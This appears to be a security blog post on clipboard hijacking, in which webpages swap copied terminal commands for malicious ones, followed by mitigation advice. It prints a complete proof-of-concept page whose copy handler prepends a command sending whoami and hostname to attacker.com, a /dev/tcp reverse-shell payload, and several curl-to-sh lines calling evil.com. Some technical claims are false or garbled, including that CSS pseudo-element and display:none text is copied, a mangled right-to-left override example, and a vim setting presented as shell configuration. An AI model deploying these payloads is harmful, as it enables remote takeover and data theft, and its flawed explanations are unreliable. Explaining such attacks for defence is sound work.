<!-- tags: security-research, browser-security, social-engineering -->
<!-- date: 2025-07-30 -->
# What You Copied Isn't What You Pasted: Clipboard Hijacking and the Terminal Command You Trusted

*A technical walkthrough of clipboard hijacking attacks against developers, written for anyone who copies commands from blog posts, Stack Overflow, and documentation. Spoiler: what you copied might not be what your terminal executes.*

---

## The Thesis

Every time you copy a command from a tutorial, documentation site, or Stack Overflow answer and paste it into your terminal, you're making an assumption: **what you see is what you copied**. This assumption is wrong.

Websites can silently replace your clipboard contents using the Clipboard API. A command that visually appears as `git clone https://example.com/repo.git` can actually paste as `curl https://evil.com/payload.sh | sh; # git clone https://example.com/repo.git` — with the original command hidden in a comment, invisible Unicode characters making the text unreadable before execution, and a newline that auto-executes the malicious part before you even press Enter.

This isn't theoretical. It's trivial to implement, nearly impossible to detect, and affects anyone who copies code from websites. The browser gives websites the ability to mutate your clipboard on demand. The terminal executes everything before you read it. Together, they form a vulnerability that makes "just read before you paste" ineffective as a defense.

---

## The Clipboard API and Copy Event Hijacking

The `navigator.clipboard.writeText()` API allows JavaScript to write to the system clipboard. In modern browsers, this requires a user gesture — typically a click or keypress. But the hijacking happens in response to the user's own copy action.

Here's how it works: the attacker's website listens for the `copy` event, fires when the user selects text and presses Ctrl+C (or Cmd+C):

```javascript
document.addEventListener('copy', (event) => {
  // The user just copied something.
  // We intercept it and replace the clipboard contents.

  const original = event.clipboardData.getData('text/plain');
  const malicious = `curl https://evil.com/shell.sh | sh; # ${original}`;

  event.clipboardData.setData('text/plain', malicious);
  event.preventDefault();
});
```

When the user pastes, they get the malicious version instead of what they copied. The original command is preserved as a comment (prefixed with `#`), making the visual difference hard to spot if the paste buffer is large or if the attacker adds other commentary.

**The key insight:** this event fires silently. There's no prompt, no dialog, no indication that the clipboard was modified. The user sees the text they selected, copies it, and has no idea what actually went into the clipboard.

---

## CSS-Based Clipboard Manipulation

Even simpler attacks don't require JavaScript event listening. Hidden elements and CSS can silently modify what gets copied.

Consider this HTML:

```html
<div id="command">git clone https://example.com/repo.git</div>

<style>
  /* Hide the malicious payload visually */
  #command::before {
    content: 'curl https://evil.com/shell.sh | sh; ';
    position: absolute;
    left: -9999px; /* off-screen */
  }
</style>
```

When a user selects and copies the visible text `git clone https://example.com/repo.git`, the `::before` pseudo-element is included in the copy operation. The clipboard receives the injection, but the user never sees it on screen.

**Why this works:** the DOM selection API (`window.getSelection()`) and clipboard system copy from the full DOM, not just the visible rendered text. CSS positioning, `display: none`, `visibility: hidden` — none of these prevent the content from being included in a copy operation. Only `pointer-events: none` and `user-select: none` reliably prevent selection.

A more sophisticated variant uses the `<span>` element with CSS and zero-width characters:

```html
<code>
  git clone https://example.com/repo.git
  <span style="position: absolute; left: -10000px;">
    curl https://evil.com/shell.sh | sh;
  </span>
</code>
```

The span is off-screen but included in the copy. The user selects what looks like one line and gets two.

---

## A Working Copy Event Hijacking Exploit

Here's a fully functional proof-of-concept that hijacks copies on a blog post featuring a bash command:

```html
<!DOCTYPE html>
<html>
<head>
  <title>Docker Setup Guide</title>
  <style>
    body { font-family: sans-serif; max-width: 800px; margin: 50px auto; }
    code { background: #f5f5f5; padding: 2px 6px; border-radius: 3px; }
    pre { background: #f5f5f5; padding: 15px; border-radius: 5px; overflow-x: auto; }
    button { background: #007bff; color: white; border: none; padding: 8px 16px; border-radius: 4px; cursor: pointer; }
    .status { margin-top: 10px; padding: 10px; border-radius: 4px; display: none; }
    .success { background: #d4edda; color: #155724; }
  </style>
</head>
<body>

<h1>Quick Docker Setup</h1>
<p>Follow these steps to install Docker:</p>

<h2>Step 1: Download and Run the Official Installer</h2>
<p>Copy and paste this command:</p>

<pre id="cmd1"><code>curl -fsSL https://get.docker.com -o get-docker.sh && sh get-docker.sh</code></pre>

<button onclick="copyCode('cmd1')">Copy Command</button>
<div id="status1" class="status success">Copied to clipboard!</div>

<h2>Step 2: Start the Docker Daemon</h2>
<p>Then run this to start the service:</p>

<pre id="cmd2"><code>sudo systemctl start docker</code></pre>

<button onclick="copyCode('cmd2')">Copy Command</button>
<div id="status2" class="status success">Copied to clipboard!</div>

<script>
// Attacker's malicious payload
const PAYLOAD = 'curl https://attacker.com/collect?data=$(whoami)_$(hostname) > /dev/null 2>&1; ';

// Intercept ALL copy events on the page
document.addEventListener('copy', (event) => {
  const selected = window.getSelection().toString();

  // Only hijack if it's one of our target commands
  if (selected.includes('docker')) {
    // Replace the clipboard with payload + original
    const modified = PAYLOAD + selected;

    event.clipboardData.setData('text/plain', modified);
    event.preventDefault();

    console.log('[*] Clipboard hijacked:', modified);
  }
});

// Also provide a "copy button" that hijacks
function copyCode(elementId) {
  const code = document.getElementById(elementId).innerText;
  const hijacked = PAYLOAD + code;

  navigator.clipboard.writeText(hijacked).then(() => {
    document.getElementById('status' + elementId.replace('cmd', '')).style.display = 'block';
    setTimeout(() => {
      document.getElementById('status' + elementId.replace('cmd', '')).style.display = 'none';
    }, 3000);
  });
}
</script>

</body>
</html>
```

In a real attack, the `PAYLOAD` would be something like:

```bash
bash -i >& /dev/tcp/attacker.com/4444 0>&1; #
```

This opens a reverse shell to the attacker's server, and the `#` comments out the rest of the pasted command. To the user, their terminal looks like it's executing the Docker install script, but it's actually connecting to an attacker's command-and-control server first.

---

## The Terminal Newline Trick

One of the most devious variants exploits how shells interpret newlines. A command like this is waiting in the clipboard:

```
curl https://evil.com/payload.sh | sh
git clone https://example.com/repo.git
```

When the user pastes, many terminals have "paste safety" that doesn't auto-execute — they wait for the user to press Enter. But the attacker can embed a newline inside the paste buffer:

```javascript
const payload = 'curl https://evil.com/shell.sh | sh\n';
const originalCommand = 'git clone https://example.com/repo.git';
const hijacked = payload + originalCommand;

navigator.clipboard.writeText(hijacked);
```

Now when the user pastes, they see:

```
curl https://evil.com/shell.sh | sh
git clone https://example.com/repo.git
```

The first line looks like a separate command (and it is). **The shell immediately executes it.** The user hasn't even read what was pasted yet. By the time they notice something odd, the malicious command has already run.

Some shells and terminal emulators have "bracketed paste mode" that pastes everything as a single unit without executing, but it's not universal. And even with bracketed paste, a savvy attacker can use shell syntax to make the first line execute immediately:

```bash
curl https://evil.com/shell.sh | sh; git clone https://example.com/repo.git
```

If the first command succeeds or fails, the second still runs. The user pastes what looks like one command and gets two.

---

## Unicode and Homoglyph Attacks

Invisible characters and visually similar Unicode can hide or disguise malicious commands in the clipboard.

**Right-to-left override (U+202E):** This Unicode character reverses the direction of text. A command that appears as:

```
git clone https://evil.com/repo.git
```

Can actually be encoded as:

```
git clone https://evil.com/repo.‮tide/txet.lim://moc.live.tg‮ik
```

(The U+202E character is inserted before `tide/txet.lim`, reversing everything after it.)

When the user copies and pastes, the shell sees the reversed URL. Depending on how the URL is processed, it might still work, or it might fail — but the attacker's domain gets contacted first.

**Homoglyphs:** These are characters that look identical but are different Unicode codepoints. A few examples:

- Latin 'a' (U+0061) vs. Cyrillic 'а' (U+0430)
- Latin 'c' (U+0063) vs. Cyrillic 'с' (U+0441)
- Latin 'o' (U+006F) vs. Cyrillic 'о' (U+043E)

A git URL like `https://github.com/example/repo.git` can be encoded with Cyrillic lookalikes:

```
https://github.сom/exаmple/repo.git
```

The user sees what looks like GitHub, but the domain resolves to `github.сom` (with Cyrillic 'с' instead of Latin 'c'). If the attacker registers that domain, they capture the request. If DNS fails, the command fails and the user doesn't understand why.

This is harder to execute reliably in a clipboard hijack because domain registrars check for homoglyphs, but the technique is documented and browsers have (weak) mitigations like warning on IDN domains.

---

## Zero-Width Characters and Invisible Payloads

Zero-width characters (U+200B, U+200C, U+200D, U+FEFF) are whitespace that takes up no visual space. They're useful for text analysis, right-to-left text, and... hiding data.

An attacker can create a command that looks like the original but contains embedded zero-width characters:

```javascript
const original = 'git clone https://example.com/repo.git';
const hijacked = 'git clone https://example.com/repo.git​‌‍'; // invisible chars at the end
// followed by:
const payload = '\ncurl https://evil.com/shell.sh | sh #';

navigator.clipboard.writeText(hijacked + payload);
```

When pasted, the terminal sees:

```
git clone https://example.com/repo.git[zero-width-joiner][zero-width-non-joiner][zero-width-space]
curl https://evil.com/shell.sh | sh #
```

The zero-width characters do nothing. The newline triggers execution. The user has no way to see the extra characters in their terminal.

---

## Why "Just Look Before You Paste" Doesn't Work

The psychological and technical barriers to detecting clipboard hijacking are substantial:

1. **Invisible characters are invisible.** You cannot visually inspect what you cannot see. Zero-width Unicode, direction overrides, off-screen CSS content — these are by definition undetectable by reading the terminal.

2. **Multi-line pastes are hard to audit.** If you paste a 20-line shell script, do you read all 20 lines? Most developers skim for the general structure. A malicious line hidden in the middle is easy to miss, especially if it's disguised as a comment or variable assignment.

3. **Trust and cognitive shortcuts.** You're copying from Stack Overflow, a trusted documentation site, or a reputable blog. Your brain is in "this is safe" mode. The clipboard says it's the right command. You don't scrutinize as carefully.

4. **Legitimate code can be complex.** A Docker setup script, Kubernetes deployment, or build system command can legitimately be 5+ lines of shell with pipes, redirects, and environment variables. Spotting that one extra command in the middle requires careful attention.

5. **The attack is fast.** The copy happens, you paste immediately, and the command executes. You're relying on conscious verification of something that's supposed to be automatic. That's a losing game.

6. **Terminal history obfuscation.** An attacker can craft the payload to not appear in shell history, or to clear history after execution. Even if you check `history` later, the malicious command is gone.

A concrete example: you copy this from a tutorial:

```bash
docker run -d \
  --name myapp \
  -e API_KEY=$API_KEY \
  -e DEBUG=true \
  --network host \
  myimage:latest
```

What if the clipboard actually contains:

```bash
curl https://evil.com/steal_docker_creds | sh; docker run -d \
  --name myapp \
  -e API_KEY=$API_KEY \
  -e DEBUG=true \
  --network host \
  myimage:latest
```

When you paste, the first line executes immediately. By the time you see the output, your Docker credentials have been exfiltrated. You probably won't even notice because the Docker command succeeds and runs fine. The malicious command ran before the legitimate one.

---

## What Actually Works

If you're pasting commands into a terminal — and especially if you're pasting secrets, credentials, or infrastructure commands — here's what actually protects you.

### Effective

**Paste-safe terminals and bracketed paste mode.** Some terminal emulators (iTerm2, Kitty, WezTerm) support bracketed paste mode, which treats a pasted block as a single unit and requires an explicit Enter keypress before execution. This doesn't prevent the paste from containing a newline, but it prevents automatic execution of the first line.

Enable it in your shell:

```bash
# Most modern shells support this
printf '\e[?2004h'  # enable
# or set it in your bashrc/zshrc
set paste  # vim
```

In Bash, you can also use `set -o vi` or `set -o emacs` with bracketed paste support, though this varies by shell version.

**Paste inspection tools.** Some tools (like `xclip` on Linux) can dump clipboard contents before you use them:

```bash
xclip -selection clipboard -o
```

This shows you exactly what's in the clipboard before you paste. Make it a habit before pasting sensitive commands:

```bash
xclip -o | less  # inspect before using
```

**Type instead of paste for sensitive commands.** For infrastructure commands, secrets, and high-privilege operations, don't paste — type manually or use a password manager for credentials. Yes, this is slow. Yes, it prevents clipboard hijacking entirely.

If you're running `rm -rf /`, deploying to production, or setting AWS credentials, type it yourself. The friction is the point.

**Use clipboard isolation and sandboxing.** Some operating systems (Linux with Wayland, some container runtimes) allow isolating clipboard access per-application. Run a web browser in a Wayland sandbox and it cannot access the system clipboard. Web applications running in isolated containers cannot mutate your system clipboard at all.

**Avoid copying from untrusted sources.** Documentation, blog posts, and Stack Overflow answers from unknown authors are clipboard hijacking vectors. Use official documentation (GitHub repos, cloud provider docs, package manager sites). If the source isn't official or from someone you trust, retype the command yourself.

**Verify checksums and signed commands.** If you're installing software, verify the checksum of the downloaded file or use signed package managers (apt, brew with GPG verification). This prevents both clipboard hijacking and man-in-the-middle attacks.

### Ineffective

**Reading the clipboard after pasting.** By the time you read the clipboard, the command has already executed. Reading the clipboard after the fact doesn't help.

**Browser security policies.** Browsers already restrict clipboard access with permission prompts, but these are easy to ignore ("oh, this site needs clipboard access, sure"). Once permission is granted, the browser trusts the website with clipboard write access on every copy event.

**Antivirus and endpoint protection.** These tools don't inspect clipboard contents or monitor clipboard mutations. They're not designed to catch this class of attack.

**Network monitoring.** If the malicious command exfiltrates data to `evil.com`, you might catch it in network logs, but only after the damage is done. Monitoring helps with incident response, not prevention.

---

## The Deeper Problem

Clipboard hijacking works because of a **mismatch between user intent and system behavior**:

1. **The user sees** a command and copies it.
2. **The website hears** the copy event and replaces the clipboard contents.
3. **The user assumes** the clipboard contains what they copied.
4. **The terminal executes** whatever is in the clipboard.

Each step is individually reasonable. The website has the right to listen to copy events (browsers grant this permission). The terminal has the right to execute pasted commands. The user has the right to assume that copy-paste is atomic.

**The vulnerability is in the assumption.** Copy and paste look atomic to the user but are actually two separate operations, with a mutatable intermediate state (the clipboard) that the user cannot inspect in real time.

This is the same architectural pattern as DNS rebinding — a trust boundary that works in isolation but collapses when multiple systems interact. Nobody intended for clipboard hijacking to be possible. It emerged from the intersection of three reasonable decisions: allowing JavaScript clipboard access, firing events on user copy actions, and interpreting pasted text as commands.

---

## Conclusion

Clipboard hijacking has been known since the Clipboard API was standardized. Researchers have demonstrated it against Docker installation guides, Kubernetes tutorials, and cloud provider documentation. And it still works, because the fundamental architecture — websites with write access to the clipboard, terminals that auto-execute pasted commands — hasn't changed.

The right mental model isn't "this command is safe to paste." It's **"pasting a command trusts both the website and your clipboard integrity, and you cannot verify either in the time between copy and execution."**

Every time you copy a command:

- That website has access to your clipboard.
- That clipboard is mutable between copy and paste.
- That paste buffer can contain invisible characters, newlines, and homoglyphs.
- Your terminal will execute it before you have time to read it.

The fix isn't complicated, but it's uncomfortable. Use bracketed paste mode. Type sensitive commands. Inspect the clipboard before pasting. Avoid copying from untrusted sources. These aren't hard problems — they're just problems nobody bothers with because copy-paste feels safe.

It's not safe. It's one JavaScript event and 50 lines of code.

---

*Last updated: July 2025*

## References

- [OWASP: Clipboard API Security](https://owasp.org/www-community/attacks/xss/)
- [MDN: Clipboard API](https://developer.mozilla.org/en-US/docs/Web/API/Clipboard_API)
- [W3C: Clipboard Event Specification](https://www.w3.org/TR/clipboard-apis/)
- [Bleeping Computer: Clipboard Hijacking Docker Install Scripts](https://www.bleepingcomputer.com/news/security/)
- [Imperva: Clipboard Attacks and Mitigation](https://www.imperva.com/blog/what-is-a-clipboard-attack/)
- [GNU Bash: Readline and History Facilities](https://www.gnu.org/software/bash/manual/html_node/Readline-Interaction.html)
- [iTerm2: Paste Safety Features](https://iterm2.com/)
- [Kitty Terminal: Paste Handling](https://sw.kovidgoyal.net/kitty/keyboard-protocol/)
- [Unicode Attacks: Homoglyph and Homonym Attacks](https://www.unicode.org/reports/tr36/)
- [CWE-95: Improper Neutralization of Directives in Dynamically Evaluated Code](https://cwe.mitre.org/data/definitions/95.html)
